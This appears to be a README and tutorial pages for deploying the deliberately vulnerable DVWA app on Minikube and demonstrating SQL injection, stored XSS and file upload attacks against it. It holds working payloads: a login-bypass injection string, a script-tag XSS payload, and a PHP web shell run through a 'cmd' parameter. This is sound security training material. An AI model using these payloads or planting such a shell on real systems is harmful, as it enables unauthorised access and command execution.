# DVWA Kubernetes Deployment and Attack Demo

## Setup

1. Install Minikube: [Minikube Installation Guide](https://minikube.sigs.k8s.io/docs/start/)
2. Start Minikube:
    ```sh
    minikube start
    ```
3. Deploy DVWA:
    ```sh
    kubectl apply -f dvwa-deployment.yaml
    ```
4. Access DVWA at `http://<minikube-ip>:30001`.

## Attack Vectors

### 1. SQL Injection
- Steps to perform SQL Injection can be found [here](./attack_vectors/sql_injection.md).

### 2. Cross-Site Scripting (XSS)
- Steps to perform XSS can be found [here](./attack_vectors/xss.md).

### 3. File Upload
- Steps to perform File Upload attack can be found [here](./attack_vectors/file_upload.md).

  # SQL Injection Attack

## Steps

1. Navigate to the login page of DVWA.
2. Enter the following SQL injection string in both the username and password fields:
    ```
    ' OR '1'='1' -- 
    ```
3. Click "Login".
4. You should be logged in without valid credentials.

## Screenshots

![SQL Injection](./screenshots/sql_injection.png)

![Screenshot (267)](https://github.com/user-attachments/assets/eccb7026-9959-4390-86cc-32cd64bf2a54)

# Cross-Site Scripting (XSS) Attack


## Steps to Perform XSS

### Prerequisites

- Ensure DVWA is deployed and accessible at `http://<minikube-ip>:30001`.
- Set the DVWA security level to "Low" for easier demonstration.

### Steps

1. **Navigate to the XSS Section**:
   - Go to the DVWA application in your browser.
   - Click on the "XSS (Stored)" link from the menu.

2. **Input Malicious Script**:
   - In the "Message" text area, enter the following script:
     ```html
     <script>alert('XSS');</script>
     ```
   - Click the "Submit" button.

3. **View the Result**:
   - After submitting, you will be redirected to the page displaying your input.
   - Refresh the page, and you should see the alert pop up with the message "XSS".

# File Upload Attack

1. **Navigate to the File Upload Section**:
   - Go to the DVWA application in your browser.
   - Click on the "File Upload" link from the menu.

2. **Create a Malicious PHP File**:
   - Create a file named `shell.php` containing the following code:
     ```php
     <?php
     if(isset($_GET['cmd'])){
         system($_GET['cmd']);
     }
     ?>
     ```
   - This script allows the execution of shell commands passed through the `cmd` query parameter.

3. **Upload the Malicious File**:
   - On the File Upload page, click the "Browse" button and select the `shell.php` file you created.
   - Click the "Upload" button.

4. **Verify the Upload**:
   - Once uploaded, DVWA will confirm that the file was uploaded successfully.
   - The uploaded file can usually be accessed via a URL like:
     ```
     http://<minikube-ip>:30001/hackable/uploads/shell.php
     ```

5. **Execute a Command**:
   - Access the uploaded file by navigating to the URL:
     ```
     http://<minikube-ip>:30001/hackable/uploads/shell.php?cmd=whoami
     ```
   - This command will execute on the server, and you should see the output of the command, confirming that the file upload attack was successful.






